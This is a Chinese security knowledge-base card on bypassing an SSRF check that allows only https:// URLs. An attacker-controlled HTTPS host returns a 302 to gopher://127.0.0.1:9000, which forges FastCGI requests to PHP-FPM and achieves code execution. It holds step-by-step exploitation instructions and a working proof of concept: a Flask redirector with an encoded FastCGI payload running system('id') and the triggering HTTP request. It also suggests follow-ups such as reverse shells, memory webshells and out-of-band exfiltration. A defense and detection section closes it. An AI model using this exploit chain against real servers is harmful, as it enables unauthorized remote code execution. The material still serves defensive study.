---
id: web-generic-ssrf-https-prefix-check-302-gopher-fastcgi
title: 只校验 URL 前缀 ^https:// 的 SSRF：用攻击者控制的 HTTPS 临时域名回 302 到 gopher://127.0.0.1:9000，伪造 FastCGI 执行任意 PHP
type: scenario
domain: web
path: web/generic/ssrf
technique: ssrf-https-prefix-regex-bypass-via-redirect-to-gopher-fastcgi
tags:
- ssrf
- gopher
- fastcgi
- php-fpm
- redirect
- regex-bypass
- curl
- rce
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W6
  verified_at: '2026-11-09T00:35:49+08:00'
  notes: 已对照原文核对（302 跳转打 FastCGI）：admin.php 的 preg_match('/^https:\\/\\//') 前缀校验、CURLOPT_FOLLOWLOCATION、ngrok 提供 HTTPS 首跳、Gopherus 生成的 FastCGI 报文（PHP_VALUE allow_url_include + auto_prepend_file=php://input、SCRIPT_FILENAME=/var/www/html/admin.php）与正文一致；本次核对未读取图片，仅依据正文；未验证点为正文用相对路径 img/10 指向 gitee 外链且未给出 9000 端口 whoami 回显原文，PoC 中 id 替换 whoami 为卡片改写；原文未标注 PHP/curl 受影响版本，未填 affected_versions
url: /docs/web/generic/ssrf/web-generic-ssrf-https-prefix-check-302-gopher-fastcgi/
draft: false
kb_aliases:
- https 前缀校验绕过
- 302 跳转到 gopher 打 FastCGI
- ngrok 临时域名做跳板
- curl FOLLOWLOCATION 跨协议跳转
- 只允许 https 的 SSRF
---

## 一句话结论

应用只用 `preg_match('/^https:\/\//', $url)` 校验用户提交的 URL 就放进 curl 并开启 `CURLOPT_FOLLOWLOCATION`，这个校验只看**入口 URL 的字符串前缀**、不看跳转后的目标：攻击者用任意一个自己控制的 HTTPS 域名（无域名时用 ngrok 之类的临时 HTTPS 隧道）返回 `302 Location: gopher://127.0.0.1:9000/_<编码后的 FastCGI 报文>`，curl 就会跨协议跳到 gopher，把伪造的 FastCGI 键值对发给本机 PHP-FPM，实现任意代码执行。

## 原理

- **校验位置错位**：`^https://` 正则只作用于用户传入的那一个字符串；URL 抓取库在跟随重定向时按 `Location` 头重新解析目标，而多数实现（PHP curl 默认 `CURLOPT_REDIR_PROTOCOLS` 未显式收窄时）不会对每一跳重新做 scheme 白名单。于是「入口是 https」与「实际请求是 gopher」可以同时成立。
- **为什么需要 HTTPS 域名**：既然入口必须 `https://` 开头，攻击者就必须真的提供一个能用 TLS 访问的地址；有域名直接签证书，没有域名就用 ngrok `ngrok http 8080` 拿到 `https://xxx.ngrok-free.app`，由本地 Flask 返回 302。
- **gopher 为什么能打 FastCGI**：`gopher://host:port/_<data>` 把 URL 解码后的 `<data>` 原样写进 TCP 连接，等于任意 TCP 报文发送器；PHP-FPM 的 FastCGI 协议是纯二进制键值对，可以完全由 `_<data>` 构造出来，无需任何握手。
- **为什么伪造 FastCGI 能执行代码**：FastCGI 的 `PHP_VALUE`/`PHP_ADMIN_VALUE` 里可以设 `allow_url_include = On` 与 `auto_prepend_file = php://input`，再让 `SCRIPT_FILENAME` 指向服务器上任意已存在的 `.php` 文件（本例 `admin.php`），FPM 在执行该脚本前会先包含请求体，请求体里的 `<?php system(...);?>` 即被执行。
- **为什么入口能到**：该 URL 抓取功能在登录后可见（本例 admin.php），而 admin 口令又通过 `.swp` 备份与 `php://filter` 二次编码读源码获得——校验只防「URL 长什么样」，不防「URL 最终连到哪」。

## 触发条件

- 用户可控 URL 直接进 curl/其它跟随重定向的 HTTP 客户端。
- 校验为正则前缀匹配（`^https://`、`startsWith("https://")`），且未对跳转目标重新校验 scheme/host/IP。
- 客户端编译时启用了 gopher 协议（PHP curl 默认支持），且 `CURLOPT_REDIR_PROTOCOLS` 未限制到 http/https。
- 目标内网/回环存在 PHP-FPM（默认 9000）且 `SCRIPT_FILENAME` 指向的文件可通过 `security.limit_extensions` 校验（通常是站点内已存在的 .php）。
- 攻击者能提供一个 HTTPS 入口（自有域名或 ngrok 等隧道）并控制其响应。

## 利用步骤

1. 确认 SSRF 点与校验规则：提交 `https://你的域名/` 观察是否发起请求；提交 `http://` 观察被拒，确认只校验前缀。
2. 在本地起一个只做 302 的小服务，`Location` 指向 `gopher://127.0.0.1:9000/_<urlencode(FastCGI 报文)>`；用 ngrok 之类把本地端口暴露成 HTTPS。
3. 用 Gopherus 之类的工具生成 FastCGI 报文：`SCRIPT_FILENAME=/var/www/html/admin.php`、`REQUEST_METHOD=POST`、`PHP_VALUE` 中设 `allow_url_include = On`、`auto_prepend_file = php://input`、`disable_functions = `，body 放 `<?php system('id');?>`。
4. 把 SSRF 参数填成 ngrok 的 https 地址，让后端 curl 先请求它、再跟随 302 到 gopher。
5. 观察回显或盲打确认：先执行 `id`/`whoami`，再换成反弹 shell 或写入内存马。
6. 无回显时把结果写进可读目录或改用 DNS/HTTP 外带（需目标出网）。

## PoC

```python
# 攻击者侧：HTTPS 入口 → 302 → gopher → FastCGI
from flask import Flask, redirect

app = Flask(__name__)

@app.route('/')
def index():
    # 由 Gopherus 生成的 FastCGI 报文（URL 编码后）：SCRIPT_FILENAME/REQUEST_METHOD/
    # PHP_VALUE(allow_url_include=On, auto_prepend_file=php://input) + <?php system('id');?>
    payload = ("%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00"
               "%01%04%00%01%01%04%04%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20"
               "%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1"
               "%0E%02CONTENT_LENGTH58%0E%04REQUEST_METHODPOST"
               "%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0A"
               "auto_prepend_file%20%3D%20php%3A//input"
               "%0F%17SCRIPT_FILENAME/var/www/html/admin.php%0D%01DOCUMENT_ROOT/%00%00%00%00"
               "%01%04%00%01%00%00%00%00%01%05%00%01%00%3A%04%00"
               "%3C%3Fphp%20system%28%27id%27%29%3Bdie%28%27---%27%29%3B%3F%3E%00%00%00%00")
    return redirect(f"gopher://127.0.0.1:9000/_{payload}")

app.run('0.0.0.0', port=8080)
# ngrok http 8080  → https://xxxx.ngrok-free.app
```

```http
POST /admin.php HTTP/1.1
Host: target
Cookie: PHPSESSID=<已登录 admin 的会话>
Content-Type: application/x-www-form-urlencoded

url=https%3A%2F%2Fxxxx.ngrok-free.app%2F
```

## 变体与关联

- **重定向载体**：自有域名直接签证书最稳；只有 IP 时用 ngrok/Cloudflare Tunnel/任意有 HTTPS 的托管页做 302。
- **目标服务替换**：同一 302 技巧可跳 `dict://`、`file://`、`gopher://` 打 Redis/MySQL/未授权 HTTP 管理口；打 FastCGI 时也可用 `PHP_ADMIN_VALUE` 加载恶意 `.so`（`extension=`）绕过 `disable_functions`。
- **与「301 跳转进 gopher」的区别**：那条链的入口本身不限制 scheme，靠重定向换协议；本链的关键是入口被 `^https://` 前缀正则卡住，必须借「合法的 HTTPS 第一跳」把校验骗过去，触发条件与利用前置不同。
- **关联**：`gopher SSRF 伪造 FastCGI：PHP_VALUE 注入 auto_prepend_file` 卡给出 FastCGI 报文构造细节；`.swp` 备份泄露与 `php://filter` 双重编码读源码用于拿 admin 口令，属常见前置信息收集。

## 检测与防御

- 对跳转链的**每一跳**重新校验：只允许 http/https，禁止 gopher/dict/file，并解析后校验 IP 是否落在私网/回环（防 DNS rebinding）。
- 关闭跟随重定向（`CURLOPT_FOLLOWLOCATION=0`），或把 `CURLOPT_REDIR_PROTOCOLS` 显式设为 `CURLPROTO_HTTP|CURLPROTO_HTTPS`；Go/Java 客户端同理设置跳转后白名单。
- 前缀正则不是安全边界：改用 `parse_url` 后比对 scheme + host 白名单 + 端口。
- 出网侧：SSRF 抓取走统一 egress 代理，禁止访问回环与内网段；PHP-FPM 只监听 unix socket 或绑定 127.0.0.1 且加 `security.limit_extensions`、限制 `PHP_VALUE`/`PHP_ADMIN_VALUE` 覆盖（`clear_env`、禁用 `allow_url_include`）。
- 检测：出站流量中出现 302 后紧跟非 http(s) 协议、对 9000 端口的内部连接、`auto_prepend_file=php://input` 特征、以及 `php://filter` 双重编码读源码的请求。
